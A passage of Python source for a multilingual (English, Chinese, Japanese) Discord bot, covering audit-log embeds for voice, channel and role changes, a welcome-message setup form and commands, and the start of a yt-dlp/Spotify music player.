            if before.mute != after.mute:
                audit_log = []
                async for entry in member.guild.audit_logs(action=discord.AuditLogAction.member_update, limit=1):
                    if entry.target and entry.target.id == member.id:
                        audit_log.append(entry)
                actor = audit_log[0].user if audit_log else None
                title = settings["mute_title"] if after.mute else settings["unmute_title"]
                color = discord.Color.red() if after.mute else discord.Color.green()
                embed = discord.Embed(title=title, color=color)
                embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
                if actor:
                    embed.add_field(name=settings["action_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(member.guild, embed)

            if before.deaf != after.deaf:
                audit_log = []
                async for entry in member.guild.audit_logs(action=discord.AuditLogAction.member_update, limit=1):
                    if entry.target and entry.target.id == member.id:
                        audit_log.append(entry)
                actor = audit_log[0].user if audit_log else None
                title = settings["deaf_title"] if after.deaf else settings["undeaf_title"]
                color = discord.Color.red() if after.deaf else discord.Color.green()
                embed = discord.Embed(title=title, color=color)
                embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
                if actor:
                    embed.add_field(name=settings["action_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(member.guild, embed)

            if before.channel != after.channel:
                audit_log = []
                async for entry in member.guild.audit_logs(action=discord.AuditLogAction.member_move if after.channel else discord.AuditLogAction.member_disconnect, limit=1):
                    if entry.target and entry.target.id == member.id:
                        audit_log.append(entry)
                actor = audit_log[0].user if audit_log else None
                if after.channel is None:
                    embed = discord.Embed(title=settings["disconnect_title"], color=discord.Color.red())
                    embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
                    embed.add_field(name=settings["channel_field"], value=f"`{before.channel.name}`" if before.channel else "Unknown", inline=False)
                    if actor:
                        embed.add_field(name=settings["action_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                else:
                    embed = discord.Embed(title=settings["move_title"], color=discord.Color.blue())
                    embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
                    embed.add_field(name=settings["from_channel_field"], value=f"`{before.channel.name}`" if before.channel else "None", inline=False)
                    embed.add_field(name=settings["to_channel_field"], value=f"`{after.channel.name}`", inline=False)
                    if actor:
                        embed.add_field(name=settings["action_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(member.guild, embed)

        except Exception as e:
            await handle_exception(member, "on_voice_state_update", "Failure", error=e)

@bot.event
async def on_guild_channel_create(channel):
    if channel.guild.id in logging_channel_ids:
        try:
            language = get_language(channel.guild.id)
            language_settings = {
                "en": {
                    "title": "Channel Created",
                    "channel_field": "Channel",
                    "type_field": "Type",
                    "created_by_field": "Created By",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "title": "頻道已創建",
                    "channel_field": "頻道",
                    "type_field": "類型",
                    "created_by_field": "創建者",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "title": "チャンネルが作成されました",
                    "channel_field": "チャンネル",
                    "type_field": "タイプ",
                    "created_by_field": "作成者",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            audit_log = []
            async for entry in channel.guild.audit_logs(action=discord.AuditLogAction.channel_create, limit=1):
                audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name=settings["channel_field"], value=f"`{channel.name}`", inline=False)
            embed.add_field(name=settings["type_field"], value=f"`{channel.type.name.capitalize()}`", inline=False)
            if actor:
                embed.add_field(name=settings["created_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
            embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
            await log_action(channel.guild, embed)
        except Exception as e:
            await handle_exception(channel, "on_guild_channel_create", "Failure", error=e)

@bot.event
async def on_guild_channel_delete(channel):
    if channel.guild.id in logging_channel_ids:
        try:
            audit_log = []
            async for entry in channel.guild.audit_logs(action=discord.AuditLogAction.channel_delete, limit=1):
                audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            embed = discord.Embed(title="Channel Deleted", color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name="Channel", value=f"`{channel.name}`", inline=False)
            embed.add_field(name="Type", value=f"`{channel.type.name.capitalize()}`", inline=False)
            if actor:
                embed.add_field(name="Deleted By", value=f"<@{actor.id}> `{actor.name}`", inline=False)
            embed.add_field(name="Date & Time", value=format_timestamp(datetime.now()), inline=False)
            await log_action(channel.guild, embed)
        except Exception as e:
            await handle_exception(channel, "on_guild_channel_delete", "Failure", error=e)

@bot.event
async def on_guild_channel_update(before, after):
    if before.guild.id in logging_channel_ids:
        try:
            language = get_language(before.guild.id)
            language_settings = {
                "en": {
                    "rename_title": "Channel Renamed",
                    "permissions_update_title": "Channel Permissions Updated",
                    "old_name_field": "Old Name",
                    "new_name_field": "New Name",
                    "type_field": "Type",
                    "renamed_by_field": "Renamed By",
                    "updated_by_field": "Updated By",
                    "channel_field": "Channel",
                    "target_field": "Target",
                    "added_permissions_field": "Permissions Added",
                    "removed_permissions_field": "Permissions Removed",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "rename_title": "頻道已重命名",
                    "permissions_update_title": "頻道權限已更新",
                    "old_name_field": "舊名稱",
                    "new_name_field": "新名稱",
                    "type_field": "類型",
                    "renamed_by_field": "重命名者",
                    "updated_by_field": "更新者",
                    "channel_field": "頻道",
                    "target_field": "目標",
                    "added_permissions_field": "新增權限",
                    "removed_permissions_field": "移除權限",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "rename_title": "チャンネル名が変更されました",
                    "permissions_update_title": "チャンネル権限が更新されました",
                    "old_name_field": "旧名",
                    "new_name_field": "新名",
                    "type_field": "タイプ",
                    "renamed_by_field": "名前変更者",
                    "updated_by_field": "更新者",
                    "channel_field": "チャンネル",
                    "target_field": "対象",
                    "added_permissions_field": "追加された権限",
                    "removed_permissions_field": "削除された権限",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            audit_log = []
            async for entry in before.guild.audit_logs(action=discord.AuditLogAction.channel_update, limit=1):
                audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            if before.name != after.name:
                embed = discord.Embed(title=settings["rename_title"], color=discord.Color.from_rgb(13, 13, 13))
                embed.add_field(name=settings["old_name_field"], value=f"`{before.name}`", inline=False)
                embed.add_field(name=settings["new_name_field"], value=f"`{after.name}`", inline=False)
                embed.add_field(name=settings["type_field"], value=f"`{after.type.name.capitalize()}`", inline=False)
                if actor:
                    embed.add_field(name=settings["renamed_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(before.guild, embed)

            audit_log = []
            async for entry in before.guild.audit_logs(action=discord.AuditLogAction.overwrite_update, limit=1):
                if entry.target.id == before.id:
                    audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            changes = []
            for target in after.overwrites:
                before_perms = before.overwrites_for(target)
                after_perms = after.overwrites_for(target)

                added_permissions = [perm for perm, value in after_perms if value and not getattr(before_perms, perm, False)]
                removed_permissions = [perm for perm, value in before_perms if value and not getattr(after_perms, perm, False)]

                if added_permissions or removed_permissions:
                    changes.append({"target": target, "added_permissions": added_permissions, "removed_permissions": removed_permissions})

            if changes:
                embed = discord.Embed(title=settings["permissions_update_title"], color=discord.Color.from_rgb(13, 13, 13))
                embed.add_field(name=settings["channel_field"], value=f"`{after.name}` ({after.type.name.capitalize()})", inline=False)
                if actor:
                    embed.add_field(name=settings["updated_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                for change in changes:
                    target_name = f"<@&{change['target'].id}>" if isinstance(change['target'], discord.Role) else f"<@{change['target'].id}>"
                    added_perms_text = ", ".join([f"`{perm}`" for perm in change['added_permissions']]) if change['added_permissions'] else "None"
                    removed_perms_text = ", ".join([f"`{perm}`" for perm in change['removed_permissions']]) if change['removed_permissions'] else "None"
                    embed.add_field(name=f"{settings['target_field']}: {target_name}", value=f"**{settings['added_permissions_field']}**: {added_perms_text}\n**{settings['removed_permissions_field']}**: {removed_perms_text}", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(before.guild, embed)
        except Exception as e:
            await handle_exception(before, "on_guild_channel_update", "Failure", error=e)

@bot.event
async def on_guild_role_update(before, after):
    if before.guild.id in logging_channel_ids:
        try:
            language = get_language(before.guild.id)
            language_settings = {
                "en": {
                    "title": "Role Permissions Updated",
                    "role_field": "Role",
                    "updated_by_field": "Updated By",
                    "permissions_added_field": "Permissions Added",
                    "permissions_removed_field": "Permissions Removed",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "title": "身分組權限已更新",
                    "role_field": "身分組",
                    "updated_by_field": "更新者",
                    "permissions_added_field": "新增權限",
                    "permissions_removed_field": "移除權限",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "title": "役職の権限が更新されました",
                    "role_field": "役職",
                    "updated_by_field": "更新者",
                    "permissions_added_field": "追加された権限",
                    "permissions_removed_field": "削除された権限",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            audit_log = []
            async for entry in before.guild.audit_logs(action=discord.AuditLogAction.role_update, limit=1):
                if entry.target.id == before.id:
                    audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            added_permissions = [perm for perm, value in after.permissions if value and not getattr(before.permissions, perm)]
            removed_permissions = [perm for perm, value in before.permissions if value and not getattr(after.permissions, perm)]

            if added_permissions or removed_permissions:
                embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
                embed.add_field(name=settings["role_field"], value=f"`{after.name}`", inline=False)
                if actor:
                    embed.add_field(name=settings["updated_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                if added_permissions:
                    embed.add_field(name=settings["permissions_added_field"], value=", ".join([f"`{perm}`" for perm in added_permissions]), inline=False)
                if removed_permissions:
                    embed.add_field(name=settings["permissions_removed_field"], value=", ".join([f"`{perm}`" for perm in removed_permissions]), inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(before.guild, embed)
        except Exception as e:
            await handle_exception(before, "on_guild_role_update", "Failure", error=e)

''' ----- Logs Channel ----- '''
#
#
#
''' ----- Welcome Message ----- '''

class WelcomeMessageModal(Modal):
    def __init__(self, language="zh"):
        language_settings = {
            "en": {
                "title_text": "Welcome Message Setup",
                "title_label": "Title",
                "title_placeholder": "Enter the welcome message title",
                "desc_label": "Content",
                "desc_placeholder": "Enter the welcome message content",
                "type_label": "Message Type",
                "type_placeholder": "Enter 'raw' or 'embed'",
                "image_url_label": "Image URL or 'author'",
                "image_url_placeholder": "Enter image URL or 'author' for member's avatar",
                "color_label": "Color",
                "color_placeholder": "Enter color (e.g., '#000000' or 'blue')",
                "success_message": "Welcome message settings have been saved!"
            },
            "zh": {
                "title_text": "歡迎訊息設定",
                "title_label": "標題",
                "title_placeholder": "請輸入歡迎訊息的標題",
                "desc_label": "內容",
                "desc_placeholder": "請輸入歡迎訊息的內容",
                "type_label": "訊息類型",
                "type_placeholder": "輸入 'raw' 或 'embed'",
                "image_url_label": "圖片連結或 'author'",
                "image_url_placeholder": "請輸入圖片URL或輸入 'author' 使用成員頭像",
                "color_label": "顏色",
                "color_placeholder": "請輸入顏色 (例如 '#000000' 或 'blue')",
                "success_message": "歡迎訊息設置已保存！"
            },
            "ja": {
                "title_text": "ウェルカムメッセージの設定",
                "title_label": "タイトル",
                "title_placeholder": "ウェルカムメッセージのタイトルを入力",
                "desc_label": "内容",
                "desc_placeholder": "ウェルカムメッセージの内容を入力",
                "type_label": "メッセージタイプ",
                "type_placeholder": "「raw」または「embed」と入力",
                "image_url_label": "画像URLまたは「author」",
                "image_url_placeholder": "画像のURLまたは「author」を入力",
                "color_label": "色",
                "color_placeholder": "色を入力（例：'#000000'または'blue'）",
                "success_message": "ウェルカムメッセージの設定が保存されました！"
            }
        }

        settings = language_settings.get(language, language_settings["zh"])

        super().__init__(title=settings["title_text"])

        self.title_input = TextInput(label=settings["title_label"], placeholder=settings["title_placeholder"])
        self.desc_input = TextInput(label=settings["desc_label"], placeholder=settings["desc_placeholder"], style=discord.TextStyle.paragraph)
        self.type_input = TextInput(label=settings["type_label"], placeholder=settings["type_placeholder"])
        self.image_url_input = TextInput(label=settings["image_url_label"], placeholder=settings["image_url_placeholder"])
        self.color_input = TextInput(label=settings["color_label"], placeholder=settings["color_placeholder"])

        self.success_message = settings["success_message"]

        self.add_item(self.title_input)
        self.add_item(self.desc_input)
        self.add_item(self.type_input)
        self.add_item(self.image_url_input)
        self.add_item(self.color_input)

    async def on_submit(self, interaction: discord.Interaction):
        guild_id = str(interaction.guild.id)

        color_map = {
            "blue": "#0000FF",
            "red": "#FF0000",
            "green": "#008000",
            "yellow": "#FFFF00",
            "black": "#000000",
            "white": "#FFFFFF",
            "purple": "#800080",
            "orange": "#FFA500",
            "pink": "#FFC0CB",
            "cyan": "#00FFFF",
            "gray": "#808080",
            "brown": "#A52A2A",
        }

        color_text = self.color_input.value.lower()
        hex_color_pattern = r"^#([A-Fa-f0-9]{6})$"

        color = color_text if re.match(hex_color_pattern, color_text) else color_map.get(color_text, "#00FF00")

        welcome_messages[guild_id] = {
            "channel_id": welcome_messages.get(guild_id, {}).get("channel_id"),
            "welcome_message": {
                "title": self.title_input.value,
                "desc": self.desc_input.value if self.desc_input.value.lower() != "none" else None,
                "type": self.type_input.value.lower(),
                "image_url": self.image_url_input.value if self.image_url_input.value.lower() != "none" else None,
                "color": color
            }
        }
        save_welcome_messages()
        await interaction.response.send_message(self.success_message, ephemeral=True)

@bot.command()
async def setwelcomechannel(ctx, channel: discord.TextChannel):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    language = get_language(ctx.guild.id)
    messages = {
        "en": "Welcome channel has been set to {}.",
        "zh": "歡迎頻道已設置為 {}。",
        "ja": "ウェルカムチャンネルが {} に設定されました。"
    }
    message = messages.get(language, messages["en"])

    guild_id = str(ctx.guild.id)
    welcome_messages[guild_id] = welcome_messages.get(guild_id, {})
    welcome_messages[guild_id]["channel_id"] = channel.id
    save_welcome_messages()
    await ctx.send(message.format(channel.mention))

@bot.command()
@commands.has_permissions(administrator=True)
async def removewelcomechannel(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    language = get_language(ctx.guild.id)
    messages = {
        "en": "The welcome channel data for this server has been removed.",
        "zh": "此伺服器的歡迎頻道資料已被移除。",
        "ja": "このサーバーのウェルカムチャンネルデータは削除されました。"
    }
    no_channel_messages = {
        "en": "No welcome channel is currently set for this server.",
        "zh": "此伺服器目前未設定歡迎頻道。",
        "ja": "このサーバーにはウェルカムチャンネルが設定されていません。"
    }
    guild_id = str(ctx.guild.id)
    if remove_welcome_message(guild_id):
        await ctx.send(messages.get(language, messages["en"]))
    else:
        await ctx.send(no_channel_messages.get(language, no_channel_messages["en"]))

@bot.command()
async def setwelcomemessage(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    language = get_language(ctx.guild.id)
    embed_titles = {
        "en": "Welcome Message Setup",
        "zh": "歡迎訊息設定",
        "ja": "ウェルカムメッセージの設定"
    }
    embed_descs = {
        "en": "Please click the button below to open the welcome message setup form.",
        "zh": "請點擊下方按鈕以開啟歡迎訊息設置表單。",
        "ja": "以下のボタンをクリックして、ウェルカムメッセージ設定フォームを開いてください。"
    }
    button_labels = {
        "zh": "點擊設定",
        "ja": "セットアップ",
        "en": "Click to Setup"
    }

    embed = discord.Embed(
        title=embed_titles.get(language, embed_titles["en"]),
        description=embed_descs.get(language, embed_descs["en"]),
        color=0x00ff00
    )

    view = discord.ui.View()
    view.add_item(discord.ui.Button(label=button_labels["zh"], style=discord.ButtonStyle.primary, custom_id="open_form_zh"))
    view.add_item(discord.ui.Button(label=button_labels["ja"], style=discord.ButtonStyle.secondary, custom_id="open_form_ja"))
    view.add_item(discord.ui.Button(label=button_labels["en"], style=discord.ButtonStyle.secondary, custom_id="open_form_en"))

    await ctx.send(embed=embed, view=view)

@bot.event
async def on_member_join(member):
    guild_id = str(member.guild.id)
    if guild_id not in welcome_messages or "channel_id" not in welcome_messages[guild_id]:
        return

    channel = bot.get_channel(welcome_messages[guild_id]["channel_id"])
    if not channel:
        return

    message_type = welcome_messages[guild_id]["welcome_message"]["type"]
    title = welcome_messages[guild_id]["welcome_message"]["title"]
    desc = welcome_messages[guild_id]["welcome_message"].get("desc")
    image_url = welcome_messages[guild_id]["welcome_message"]["image_url"]
    color_hex = welcome_messages[guild_id]["welcome_message"]["color"]

    desc = desc.replace("<author>", f"<@{member.id}>")

    if message_type == "embed":
        embed = discord.Embed(title=title, description=desc, color=discord.Color.from_str(color_hex))
        if image_url.lower() == "author" and member.avatar:
            embed.set_thumbnail(url=member.avatar.url)
        else:
            embed.set_image(url=image_url)
        await channel.send(embed=embed)
    else:
        message_content = f"{title}\n\n{desc}" if desc else title
        await channel.send(message_content)

''' ----- Welcome Message ----- '''
#
#
#
''' ----- Music Bot ----- '''

MUSIC_LANGUAGES_TEXTS = {
    "en": {
        "error_fetch_audio": "Could not fetch audio.",
        "error_invalid_spotify_url": "Invalid Spotify URL.",
        "queue_empty": "The queue is empty.",
        "now_playing": "Now Playing",
        "playing_track": "Playing: **{track_title}**",
        "added_to_queue": "Added to Queue",
        "added_track": "**{track_title}** added to queue.",
        "duplicate_track": "Duplicate Track",
        "track_already_in_queue": "Track **{track_title}** is already in the queue.",
        "loop_mode": "Loop Mode",
        "loop_mode_set": "Loop mode set to: **{mode_text}**.",
        "invalid_loop_mode": "Invalid loop mode. Use 'off', 'track', or 'queue'.",
        "playback_progress": "Playback Progress",
        "time": "Time",
        "queue_title": "Queue",
        "searching": "Searching for:",
        "added_playlist": "Added playlist **{playlist_name}** with **{track_count}** tracks to the queue.",
        "playlist_no_new_tracks": "No new tracks from the playlist were added to the queue.",
        "error": "An error occurred.",
        "error_no_voice_channel": "You must be in a voice channel to use this command.",
        "music_stopped": "Music playback has stopped.",
        "queue_cleared": "The queue has been cleared.",
        "disconnected": "Disconnected.",
        "bot_left_channel": "The bot has left the voice channel.",
        "skip_success": "Skipped Track",
        "skip_message": "Skipped **{track_title}**. Playing next track...",
    },
    "zh": {
        "error_fetch_audio": "無法獲取音訊。",
        "error_invalid_spotify_url": "無效的 Spotify URL。",
        "queue_empty": "隊列為空。",
        "now_playing": "播放中",
        "playing_track": "正在播放：**{track_title}**",
        "added_to_queue": "已添加到隊列",
        "added_track": "**{track_title}** 已添加到隊列。",
        "duplicate_track": "重複的曲目",
        "track_already_in_queue": "曲目 **{track_title}** 已在隊列中。",
        "loop_mode": "循環模式",
        "loop_mode_set": "循環模式已設置為：**{mode_text}**。",
        "invalid_loop_mode": "無效的循環模式。請使用 'off'、'track' 或 'queue'。",
        "playback_progress": "播放進度",
        "time": "時間",
        "queue_title": "播放隊列",
        "searching": "正在搜索：",
        "added_playlist": "已將播放清單 **{playlist_name}** 中的 **{track_count}** 首歌曲加入至隊列。",
        "playlist_no_new_tracks": "播放清單中沒有新歌曲加入至隊列。",
        "error": "發生錯誤。",
        "error_no_voice_channel": "您必須在語音頻道中才能使用此指令。",
        "music_stopped": "音樂播放已停止。",
        "queue_cleared": "播放隊列已清空。",
        "disconnected": "已斷開連接。",
        "bot_left_channel": "機器人已離開語音頻道。",
        "skip_success": "跳過曲目",
        "skip_message": "跳過了 **{track_title}**，播放下一首歌曲...",
    },
    "ja": {
        "error_fetch_audio": "オーディオを取得できませんでした。",
        "error_invalid_spotify_url": "無効な Spotify URL です。",
        "queue_empty": "キューは空です。",
        "now_playing": "再生中",
        "playing_track": "再生中：**{track_title}**",
        "added_to_queue": "キューに追加されました",
        "added_track": "**{track_title}** がキューに追加されました。",
        "duplicate_track": "重複したトラック",
        "track_already_in_queue": "トラック **{track_title}** はすでにキューにあります。",
        "loop_mode": "ループモード",
        "loop_mode_set": "ループモードが設定されました：**{mode_text}**。",
        "invalid_loop_mode": "無効なループモードです。「off」、「track」、「queue」を使用してください。",
        "playback_progress": "再生進行状況",
        "time": "タイム",
        "queue_title": "再生キュー",
        "searching": "検索中：",
        "added_playlist": "プレイリスト **{playlist_name}** から **{track_count}** 件のトラックをキューに追加しました。",
        "playlist_no_new_tracks": "プレイリストに新しいトラックがありませんでした。",
        "error": "エラーが発生しました。",
        "error_no_voice_channel": "このコマンドを使用するには、ボイスチャンネルに参加する必要があります。",
        "music_stopped": "音楽の再生が停止しました。",
        "queue_cleared": "キューがクリアされました。",
        "disconnected": "切断されました。",
        "bot_left_channel": "ボットはボイスチャンネルを退出しました。",
        "skip_success": "スキップしました",
        "skip_message": "**{track_title}** をスキップしました。次のトラックを再生中...",
    }
}

def get_message(guild_id, key, **kwargs):
    language = get_language(guild_id)
    message = MUSIC_LANGUAGES_TEXTS.get(language, {}).get(key, "")
    return message.format(**kwargs)

os.environ["SPOTIPY_CLIENT_ID"] = os.getenv("SPOTIPY_CLIENT_ID")
os.environ["SPOTIPY_CLIENT_SECRET"] = os.getenv("SPOTIPY_CLIENT_SECRET")
spotify = Spotify(client_credentials_manager=SpotifyClientCredentials())

YDL_OPTIONS = {
    'format': 'bestaudio',
    'noplaylist': True,
    'outtmpl': 'workspace/downloaded_music/%(title)s.%(ext)s',
    'default_search': 'ytsearch'
}
FFMPEG_OPTIONS = {'options': '-vn'}

queue = deque()
current_track = None
next_track_id = 1
start_time = None
progress_message = None
loop_mode = 0 

def create_progress_bar(elapsed, duration):
    progress = int((elapsed / duration) * 20)
    return f"`{'▬' * progress}🔘{'▬' * (20 - progress - 1)}`"

def format_time(seconds):
    return time.strftime("%M:%S", time.gmtime(seconds))

async def send_embed(ctx, title, description, color):
    language = get_language(ctx.guild.id)
    localized_title = MUSIC_LANGUAGES_TEXTS.get(language, {}).get(title, title)
    localized_description = MUSIC_LANGUAGES_TEXTS.get(language, {}).get(description, description)
    await ctx.send(embed=discord.Embed(title=localized_title, description=localized_description, color=color))

async def download_audio(ctx, url):
    try:
        guild_id = str(ctx.guild.id)
        download_path = f'workspace/downloaded_music/{guild_id}'
        os.makedirs(download_path, exist_ok=True)
        ydl_opts = YDL_OPTIONS.copy()
        ydl_opts['outtmpl'] = f'{download_path}/%(title)s.%(ext)s'
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if "playlist" in url:
                info = ydl.extract_info(url, download=True)
                playlist_title = info.get("title", "Playlist")
                entries = info.get("entries", [])
                for entry in entries:
                    entry["playlist_title"] = playlist_title
                return entries
            else:
                info = ydl.extract_info(url, download=True)
                return [info]
    except Exception as e:
        await send_embed(ctx, "Error", "Could not download audio.", discord.Color.red())
        return None

async def download_spotify_audio(ctx, spotify_url):
    try:
        guild_id = str(ctx.guild.id)
        download_path = f'workspace/downloaded_music/{guild_id}'
        os.makedirs(download_path, exist_ok=True)
        ydl_opts = YDL_OPTIONS.copy()
        ydl_opts['outtmpl'] = f'{download_path}/%(title)s.%(ext)s'
        match = re.search(r"track/([a-zA-Z0-9]+)", spotify_url)
        playlist_match = re.search(r"playlist/([a-zA-Z0-9]+)", spotify_url)
        if match:
            track_id = match.group(1)
            spotify_track = spotify.track(track_id)
            search_query = f"{spotify_track['name']} {spotify_track['artists'][0]['name']}"
            thumbnail = spotify_track['album']['images'][0]['url']
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(f"ytsearch:{search_query}", download=True)['entries'][0]
                info['thumbnail'] = thumbnail
                return [info]
        elif playlist_match:
            playlist_id = playlist_match.group(1)
            playlist_tracks = spotify.playlist_items(playlist_id)['items']
            results = []
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                for item in playlist_tracks:
                    track = item['track']
                    search_query = f"{track['name']} {track['artists'][0]['name']}"
                    thumbnail = track['album']['images'][0]['url']
                    info = ydl.extract_info(f"ytsearch:{search_query}", download=True)['entries'][0]
                    info['thumbnail'] = thumbnail
                    results.append(info)
            return results
        else:
            await send_embed(ctx, "Error", "Invalid Spotify URL.", discord.Color.red())
            return None
    except Exception as e:
        await send_embed(ctx, "Error", "Could not download Spotify playlist.", discord.Color.red())
        return None

async def send_playing_embed(ctx, track, position=0):
    language = get_language(ctx.guild.id)
    duration = track.get('duration', 1)
    embed = discord.Embed(
        title=MUSIC_LANGUAGES_TEXTS[language]["now_playing"],
        description=MUSIC_LANGUAGES_TEXTS[language]["playing_track"].format(track_title=track['title']),
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=track.get('thumbnail'))
    progress_bar = create_progress_bar(position, duration)
    embed.add_field(
        name=MUSIC_LANGUAGES_TEXTS[language]["playback_progress"],
        value=progress_bar,
        inline=False
    )
    time_display = f"{format_time(position)} / {format_time(duration)}"
    embed.add_field(
        name=MUSIC_LANGUAGES_TEXTS[language]["time"],
        value=time_display,
        inline=False
    )
    return await ctx.send(embed=embed)

@tasks.loop(seconds=1)
async def update_progress(ctx):
    global start_time, progress_message

    language = get_language(ctx.guild.id)

    if not current_track or not ctx.voice_client or not ctx.voice_client.is_playing():
        update_progress.stop()
        return

    elapsed = int(time.time() - start_time)
    duration = current_track.get("duration", 0)

    if elapsed >= duration:
        if loop_mode == 1:
            start_time = time.time()
        else:
            update_progress.stop()
            await play_next(ctx)
            return

    progress_bar = create_progress_bar(elapsed, duration)
    time_display = f"{format_time(elapsed)} / {format_time(duration)}"

    if progress_message:
        try:
            embed = progress_message.embeds[0]
            embed.set_field_at(
                0, 
                name=MUSIC_LANGUAGES_TEXTS[language]["playback_progress"],
                value=progress_bar, 
                inline=False
            )
            embed.set_field_at(
                1, 
                name=MUSIC_LANGUAGES_TEXTS[language]["time"],
                value=time_display, 
                inline=False
            )
            await progress_message.edit(embed=embed)
        except Exception as e:
            print(f"Error updating progress bar: {e}")
            progress_message = None

async def send_processing_embed(ctx, title, description, color):
    language = get_language(ctx.guild.id)
    localized_title = MUSIC_LANGUAGES_TEXTS[language].get(title, title)
    localized_description = MUSIC_LANGUAGES_TEXTS[language].get(description, description)

    embed = discord.Embed(color=color)
    embed.add_field(
        name=f"🎶 {localized_title}",
        value=f"🌐 {localized_description}",
        inline=False
    )
    return await ctx.send(embed=embed)

@bot.command(name='tracklist')
async def tracklist(ctx):
    global current_track
    language = get_language(ctx.guild.id)
    queue_title = MUSIC_LANGUAGES_TEXTS[language]["queue_title"]
    description = f"**{MUSIC_LANGUAGES_TEXTS[language]['now_playing']}:** {current_track['title']}\n" if current_track else ""
    description += "\n".join([f"{i+1}. {track['title']}" for i, track in enumerate(queue)]) if queue else MUSIC_LANGUAGES_TEXTS[language]["queue_empty"]
    await send_embed(ctx, queue_title, description, discord.Color.purple())

@bot.command(name='play')
async def play(ctx, url: str):
    global current_track, next_track_id

    language = get_language(ctx.guild.id)
    guild_id = str(ctx.guild.id)
    download_path = f'workspace/downloaded_music/{guild_id}'
    os.makedirs(download_path, exist_ok=True)

    if not ctx.author.voice:
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["error"],
            MUSIC_LANGUAGES_TEXTS[language]["error_no_voice_channel"],
            discord.Color.red()
        )
        return

    voice_channel = ctx.author.voice.channel
    if ctx.voice_client is None:
        await voice_channel.connect()
    elif ctx.voice_client.channel != voice_channel:
        await ctx.voice_client.move_to(voice_channel)

    process_message = None
    try:
        process_message = await send_processing_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["searching"],
            url,
            discord.Color.dark_gray()
        )

        ydl_opts = YDL_OPTIONS.copy()
        ydl_opts['outtmpl'] = f'{download_path}/%(title)s.%(ext)s'

        playlist_name = "Playlist"
        if "spotify.com" in url:
            tracks_info = await download_spotify_audio(ctx, url)
            playlist_name = tracks_info[0].get("playlist", "Spotify Playlist") if tracks_info else "Spotify Playlist"
        elif "youtube.com" in url or "youtu.be" in url:
            tracks_info = await download_audio(ctx, url)
            playlist_name = tracks_info[0].get("playlist_title", "Playlist") if tracks_info else "Playlist"
        else:
            await send_embed(
                ctx,
                MUSIC_LANGUAGES_TEXTS[language]["error"],
                MUSIC_LANGUAGES_TEXTS[language]["error_invalid_spotify_url"],
                discord.Color.red()
            )
            return

        if not tracks_info:
            if process_message:
                await process_message.delete()
            return

        added_count = 0
        for info in tracks_info:
            file_path = yt_dlp.YoutubeDL(ydl_opts).prepare_filename(info)
            track = {
                'id': next_track_id,
                'title': info.get('title', MUSIC_LANGUAGES_TEXTS[language].get("unknown_title", "Unknown Title")),
                'file_path': file_path,
                'duration': info.get('duration', 0),
                'thumbnail': info.get('thumbnail')
            }
            next_track_id += 1

            if any(t['file_path'] == file_path for t in queue):
                continue

            if ctx.voice_client.is_playing() or current_track:
                queue.append(track)
                added_count += 1
            else:
                current_track = track
                queue.append(current_track)
                await play_next(ctx)

        if added_count > 0:
            await send_embed(
                ctx,
                MUSIC_LANGUAGES_TEXTS[language]["added_to_queue"],
                MUSIC_LANGUAGES_TEXTS[language]["added_playlist"].format(
                    playlist_name=playlist_name,
                    track_count=added_count
